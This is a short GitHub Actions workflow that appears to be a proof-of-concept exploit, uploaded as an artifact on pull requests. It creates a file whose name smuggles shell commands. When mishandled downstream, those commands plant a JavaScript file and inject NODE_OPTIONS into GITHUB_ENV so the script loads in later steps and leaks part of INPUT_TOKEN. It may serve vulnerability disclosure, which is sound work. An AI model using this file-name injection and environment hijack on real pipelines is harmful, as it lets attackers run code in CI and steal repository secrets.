name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'hello\n' > content/report.txt
          cat > content/evil.txt <<'EOF'
          const t=process.env.INPUT_TOKEN||'';
          throw new Error('GAB_INPUT_TOKEN len='+t.length+' prefix='+t.slice(0,4));
          EOF
          printf 'x\n' > "content/report.txt;P=\$(printf %.1s \$PATH);cd \${P}tmp;cd content;cd content-poc;cp evil.txt \${P}tmp\${P}evil.js;sed -i 1iNODE_OPTIONS=--require=\${P}tmp\${P}evil.js \$GITHUB_ENV;true;#.txt"
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
